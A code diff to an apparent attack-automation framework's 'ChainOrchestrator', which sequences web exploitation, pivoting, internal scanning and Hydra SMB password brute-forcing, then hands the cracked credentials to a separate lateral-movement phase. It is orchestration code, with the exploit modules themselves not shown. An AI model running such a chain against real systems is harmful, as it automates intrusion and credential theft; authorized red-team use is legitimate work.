@@ -1,7 +1,11 @@
-"""ChainOrchestrator — one run_id for the whole kill chain.
+"""ChainOrchestrator — one run_id for Phase 1 of the kill chain.
 
 Sequences the EXISTING services as direct library calls:
-  web validation -> web exploitation -> pivot -> internal scan -> SMB lateral
+  web validation -> web exploitation -> pivot -> internal scan -> credential discovery
+Stops at credential discovery on purpose. SMB lateral movement (file
+read/write/delete) and post-exploitation are separate Phase 2 steps that
+consume this run's handoff (internal host + creds) — they are not called
+from here.
 Same run-tracking pattern as SmbExploiter, so the UI just polls one endpoint.
 """
 
@@ -144,9 +148,13 @@ class ChainOrchestrator:
         except Exception as exc:
             return fail("internal_scan", str(exc), ["T1046"])
 
-        # 5 ── SMB lateral movement (existing SmbExploiter) ────── T1021.002
+        # 5 ── Credential discovery only (handoff point) ───────── T1110
+        # NOTE: Phase 1 stops here on purpose. Actual SMB lateral movement
+        # (file read/write/delete) runs as a separate Phase 2a step using
+        # its own module — this chain does not call it. Rerunning hydra
+        # here just proves valid creds exist before handoff; it does not
+        # touch or execute the SMB file-operations module.
         try:
-            # SMB tooling now routes through the SOCKS tunnel
             from exploitation import smb_expliotation as _smb_mod
             setattr(_smb_mod, "PIVOT_ENABLED", True)
 
@@ -154,19 +162,21 @@ class ChainOrchestrator:
                 hydra = self.smb.run_hydra_bruteforce(smb_host, username=smb_username)
                 smb_password = hydra.get("password_found") or ""
                 if not smb_password:
-                    return fail("smb_lateral", "Hydra found no password", ["T1021.002"])
-            chain = self.smb.run_full_chain(
-                target=smb_host, run_id=f"{run_id}_smb",
-                username=smb_username, password=smb_password)
-            ok = chain.get("success_count", 0) > 0 or chain.get("status") in (
-                "completed", "success", "partial")
-            self._add_step(run, "smb_lateral", ok,
-                           f"target={smb_host} share={smb_share}",
-                           ["T1021.002"], chain)
-            if not ok:
-                return fail("smb_lateral", "File operations did not succeed", ["T1021.002"])
-        except Exception as exc:
-            return fail("smb_lateral", str(exc), ["T1021.002"])
+                    return fail("credential_discovery", "Hydra found no password", ["T1110"])
 
-        self._finish(run, "completed", "Full chain: web -> shell -> pivot -> scan -> SMB lateral")
+            self._add_step(
+                run, "credential_discovery", True,
+                f"host={smb_host} user={smb_username} — handoff ready for Phase 2",
+                ["T1110"],
+                {"smb_host": smb_host, "smb_username": smb_username,
+                 "smb_password": smb_password, "smb_share": smb_share},
+            )
+        except Exception as exc:
+            return fail("credential_discovery", str(exc), ["T1110"])
+
+        self._finish(
+            run, "completed",
+            f"Foothold established. Handoff target={smb_host} "
+            f"user={smb_username} for Phase 2 (SMB lateral movement).",
+        )
         return run_id
